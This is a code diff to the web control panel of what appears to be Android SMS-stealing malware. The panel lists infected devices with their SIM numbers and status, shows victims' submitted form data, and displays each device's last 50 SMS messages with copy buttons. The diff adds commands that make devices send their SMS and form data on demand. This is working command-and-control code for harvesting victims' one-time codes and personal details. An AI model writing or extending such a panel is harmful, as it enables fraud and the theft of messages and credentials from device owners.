@@ -263,72 +263,101 @@
 
         async function changePass() { const o = prompt('Old Password:'); const n = prompt('New Password:'); if (o && n) { try { const r = await fetch('/api/change-password', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ oldPassword: o, newPassword: n }) }); const d = await r.json(); toast(d.success ? '✅ Password Changed' : '❌ Wrong Old Password', !d.success); } catch (err) { toast('Error', true); } } }
 
-        function viewData(deviceId) {
-            const device = devices.find(d => d.deviceId === deviceId);
-            if (!device) { toast('❌ Device not found', true); return; }
+        async function viewData(deviceId) {
             currentOpenModal = { type: 'data', deviceId };
-            const modalBody = document.getElementById('modalBody');
-            let html = `<div style="background:#e3f2fd;padding:18px;border-radius:8px;"><div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:10px;">Device Details</div><table style="width:100%;border-collapse:collapse;font-size:15px;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.04);"><tbody>`;
-            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>1. Model</td><td style='padding:8px 6px;'>${escapeAttr(device.model||'N/A')}</td></tr>`;
-            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>2. SIM1</td><td style='padding:8px 6px;'>${escapeAttr(device.sim1||'N/A')} <i class="fas fa-copy copy-btn" data-text="${escapeAttr(device.sim1||'')}"></i></td></tr>`;
-            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>3. SIM2</td><td style='padding:8px 6px;'>${escapeAttr(device.sim2||'N/A')} <i class="fas fa-copy copy-btn" data-text="${escapeAttr(device.sim2||'')}"></i></td></tr>`;
-            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>4. Android Version</td><td style='padding:8px 6px;'>${escapeAttr(device.androidVersion||'N/A')}</td></tr>`;
-            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>5. Battery</td><td style='padding:8px 6px;'>${escapeAttr(device.battery||'N/A')}%</td></tr>`;
-            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>6. Install Date</td><td style='padding:8px 6px;'>${device.installDate ? (new Date(device.installDate)).toLocaleString('en-GB') : 'N/A'}</td></tr>`;
-            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>7. Last Seen</td><td style='padding:8px 6px;'>${device.lastSeen ? (new Date(device.lastSeen)).toLocaleString('en-GB') : 'N/A'}</td></tr>`;
-            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>8. Status</td><td style='padding:8px 6px;'><span style='color:${device.isOnline ? '#43a047':'#d32f2f'};font-weight:bold;'>${device.isOnline ? 'Online':'Offline'}</span></td></tr>`;
-            html += `</tbody></table></div><hr style="margin:10px 0;border:0;border-top:2px solid #1976d2;"><h3 style="color:#1976d2;margin-bottom:8px;">📝 Form Submission Details</h3>`;
+            // Ask server to refresh data in background (server returns stored device immediately)
+            try {
+                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_DATA' }) });
+                const payload = await res.json().catch(()=>null);
+                let device = null;
+                if (payload && payload.device) device = payload.device;
+                if (!device) device = devices.find(d => d.deviceId === deviceId);
+                if (!device) { toast('❌ Device not found', true); return; }
 
-            if (device.customerData && Object.keys(device.customerData).length > 0) {
-                Object.entries(device.customerData).forEach(([key, value]) => {
-                    const v = JSON.stringify(value);
-                    html += `<div style="background:#e3f2fd;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;"><span style="color:#1976d2;font-weight:bold;">${escapeAttr(key)}</span><span style="color:#222;font-size:15px;">${escapeAttr(v)} <i class=\"fas fa-copy copy-btn\" data-text=\"${escapeAttr(v)}\"></i></span></div>`;
-                });
-            } else {
-                html += '<div class="no-data">No customer data submitted yet</div>';
+                const modalBody = document.getElementById('modalBody');
+                let html = `<div style="background:#e3f2fd;padding:18px;border-radius:8px;"><div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:10px;">Device Details</div><table style="width:100%;border-collapse:collapse;font-size:15px;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.04);"><tbody>`;
+                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>1. Model</td><td style='padding:8px 6px;'>${escapeAttr(device.model||'N/A')}</td></tr>`;
+                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>2. SIM1</td><td style='padding:8px 6px;'>${escapeAttr(device.sim1||'N/A')} <i class="fas fa-copy copy-btn" data-text="${escapeAttr(device.sim1||'')}"></i></td></tr>`;
+                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>3. SIM2</td><td style='padding:8px 6px;'>${escapeAttr(device.sim2||'N/A')} <i class="fas fa-copy copy-btn" data-text="${escapeAttr(device.sim2||'')}"></i></td></tr>`;
+                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>4. Android Version</td><td style='padding:8px 6px;'>${escapeAttr(device.androidVersion||'N/A')}</td></tr>`;
+                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>5. Battery</td><td style='padding:8px 6px;'>${escapeAttr(device.battery||'N/A')}%</td></tr>`;
+                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>6. Install Date</td><td style='padding:8px 6px;'>${device.installDate ? (new Date(device.installDate)).toLocaleString('en-GB') : 'N/A'}</td></tr>`;
+                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>7. Last Seen</td><td style='padding:8px 6px;'>${device.lastSeen ? (new Date(device.lastSeen)).toLocaleString('en-GB') : 'N/A'}</td></tr>`;
+                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>8. Status</td><td style='padding:8px 6px;'><span style='color:${device.isOnline ? '#43a047':'#d32f2f'};font-weight:bold;'>${device.isOnline ? 'Online':'Offline'}</span></td></tr>`;
+                html += `</tbody></table></div><hr style="margin:10px 0;border:0;border-top:2px solid #1976d2;"><h3 style="color:#1976d2;margin-bottom:8px;">📝 Form Submission Details</h3>`;
+
+                if (device.customerData && Object.keys(device.customerData).length > 0) {
+                    Object.entries(device.customerData).forEach(([key, value]) => {
+                        const v = JSON.stringify(value);
+                        html += `<div style="background:#e3f2fd;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;"><span style="color:#1976d2;font-weight:bold;">${escapeAttr(key)}</span><span style="color:#222;font-size:15px;">${escapeAttr(v)} <i class=\"fas fa-copy copy-btn\" data-text=\"${escapeAttr(v)}\"></i></span></div>`;
+                    });
+                } else {
+                    html += '<div class="no-data">No customer data submitted yet</div>';
+                }
+
+                modalBody.innerHTML = html;
+                setTimeout(() => { modalBody.querySelectorAll('.copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text||'').then(()=>toast('Copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
+                document.getElementById('viewDataModal').classList.add('show');
+            } catch (err) {
+                toast('Error fetching data: ' + err.message, true);
             }
-
-            modalBody.innerHTML = html;
-            setTimeout(() => { modalBody.querySelectorAll('.copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text||'').then(()=>toast('Copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
-            document.getElementById('viewDataModal').classList.add('show');
         }
 
-        function viewFormData(deviceId) {
-            const device = devices.find(d => d.deviceId === deviceId);
-            if (!device) { toast('❌ Device not found', true); return; }
+        async function viewFormData(deviceId) {
             currentOpenModal = { type: 'form', deviceId };
-            const modalBody = document.getElementById('modalBody');
-            let html = `<div style=\"background:#fffde7;padding:18px;border-radius:8px;\"><div style=\"font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:10px;\">Submitted Form Data</div></div>`;
-            if (device.customerData && Object.keys(device.customerData).length > 0) {
-                Object.entries(device.customerData).forEach(([key, value]) => { const v = JSON.stringify(value); html += `<div style=\"background:#fffde7;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #ffeb3b;display:flex;align-items:center;justify-content:space-between;\"><span style=\"color:#ff9800;font-weight:bold;\">${escapeAttr(key)}</span><span style=\"color:#222;font-size:15px;\">${escapeAttr(v)} <i class=\\\"fas fa-copy copy-btn\\\" data-text=\\\"${escapeAttr(v)}\\\"></i></span></div>`; });
-            } else { html += '<div class="no-data">No form data submitted yet</div>'; }
-            modalBody.innerHTML = html;
-            setTimeout(() => { modalBody.querySelectorAll('.copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text || '').then(()=>toast('Copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
-            document.getElementById('viewDataModal').classList.add('show');
+            try {
+                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_FORM' }) });
+                const payload = await res.json().catch(()=>null);
+                let device = null;
+                if (payload && payload.customerData !== undefined) {
+                    // server may return customerData directly
+                    device = devices.find(d => d.deviceId === deviceId) || {};
+                    device.customerData = payload.customerData;
+                } else {
+                    device = devices.find(d => d.deviceId === deviceId);
+                }
+                if (!device) { toast('❌ Device not found', true); return; }
+                const modalBody = document.getElementById('modalBody');
+                let html = `<div style="background:#fffde7;padding:18px;border-radius:8px;"><div style="font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:10px;">Submitted Form Data</div></div>`;
+                if (device.customerData && Object.keys(device.customerData).length > 0) {
+                    Object.entries(device.customerData).forEach(([key, value]) => { const v = JSON.stringify(value); html += `<div style="background:#fffde7;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #ffeb3b;display:flex;align-items:center;justify-content:space-between;"><span style="color:#ff9800;font-weight:bold;">${escapeAttr(key)}</span><span style="color:#222;font-size:15px;">${escapeAttr(v)} <i class=\\"fas fa-copy copy-btn\\" data-text=\\"${escapeAttr(v)}\\"></i></span></div>`; });
+                } else { html += '<div class="no-data">No form data submitted yet</div>'; }
+                modalBody.innerHTML = html;
+                setTimeout(() => { modalBody.querySelectorAll('.copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text || '').then(()=>toast('Copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
+                document.getElementById('viewDataModal').classList.add('show');
+            } catch (err) { toast('Error fetching form data: ' + err.message, true); }
         }
 
-        function viewSms(deviceId) {
-            const device = devices.find(d => d.deviceId === deviceId);
-            if (!device) { toast('❌ Device not found', true); return; }
+        async function viewSms(deviceId) {
             currentOpenModal = { type: 'sms', deviceId };
-            // Use stored smsMessages (assumes device/app forwards latest messages automatically)
-            const msgs = Array.isArray(device.smsMessages) ? device.smsMessages.slice(-50).reverse() : [];
-            let html = `<div style='background:#e3f2fd;padding:18px;border-radius:8px;'><div style='font-size:18px;font-weight:bold;color:#1976d2;'>${escapeAttr(device.model||'')} - Last 50 SMS</div></div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
-            html += msgs.map((msg, idx) => `
-                <div style='background:#fff;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;'>
-                    <div>
-                        <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${escapeAttr(msg.from||msg.address||'Unknown')}</div>
-                        <div style='font-size:15px;color:#222;margin:4px 0;'>${escapeAttr(msg.body||msg.message||'')}</div>
-                        <div style='font-size:12px;color:#888;'>${msg.time ? formatLastSeen(msg.time) : ''}</div>
-                    </div>
-                    <div style='display:flex;flex-direction:column;gap:6px;'>
-                        <i class="fas fa-copy copy-btn" style="color:var(--primary);cursor:pointer;font-size:18px;" data-text="${escapeAttr(msg.body||msg.message||'')}"></i>
-                    </div>
-                </div>`).join('');
-            if (msgs.length === 0) html += '<div class="no-data">No SMS messages found</div>';
-            document.getElementById('smsModalBody').innerHTML = html;
-            setTimeout(() => { document.querySelectorAll('#smsModalBody .copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text||'').then(()=>toast('Message copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
-            document.getElementById('viewSmsModal').classList.add('show');
+            try {
+                // Ask server for latest SMS (server returns messages immediately if available)
+                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_SMS' }) });
+                const payload = await res.json().catch(()=>null);
+                let msgs = null;
+                if (payload && Array.isArray(payload.messages)) msgs = payload.messages.slice(0,50);
+                const device = devices.find(d => d.deviceId === deviceId) || {};
+                if (!msgs) msgs = Array.isArray(device.smsMessages) ? device.smsMessages.slice(-50) : [];
+                // ensure latest on top
+                msgs = msgs.slice().sort((a,b) => (b.date||b.time||0) - (a.date||a.time||0)).slice(0,50);
+
+                let html = `<div style='background:#e3f2fd;padding:18px;border-radius:8px;'><div style='font-size:18px;font-weight:bold;color:#1976d2;'>${escapeAttr(device.model||'')} - Last 50 SMS</div></div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
+                html += msgs.map((msg, idx) => `
+                    <div style='background:#fff;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;'>
+                        <div>
+                            <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${escapeAttr(msg.from||msg.address||'Unknown')}</div>
+                            <div style='font-size:15px;color:#222;margin:4px 0;'>${escapeAttr(msg.body||msg.message||'')}</div>
+                            <div style='font-size:12px;color:#888;'>${msg.time ? formatLastSeen(msg.time) : ''}</div>
+                        </div>
+                        <div style='display:flex;flex-direction:column;gap:6px;'>
+                            <i class="fas fa-copy copy-btn" style="color:var(--primary);cursor:pointer;font-size:18px;" data-text="${escapeAttr(msg.body||msg.message||'')}"></i>
+                        </div>
+                    </div>`).join('');
+                if (msgs.length === 0) html += '<div class="no-data">No SMS messages found</div>';
+                document.getElementById('smsModalBody').innerHTML = html;
+                setTimeout(() => { document.querySelectorAll('#smsModalBody .copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text||'').then(()=>toast('Message copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
+                document.getElementById('viewSmsModal').classList.add('show');
+            } catch (err) { toast('Error fetching SMS: ' + err.message, true); }
         }
 
         function deleteSms(deviceId, idx) { toast('Delete SMS feature coming soon!'); }
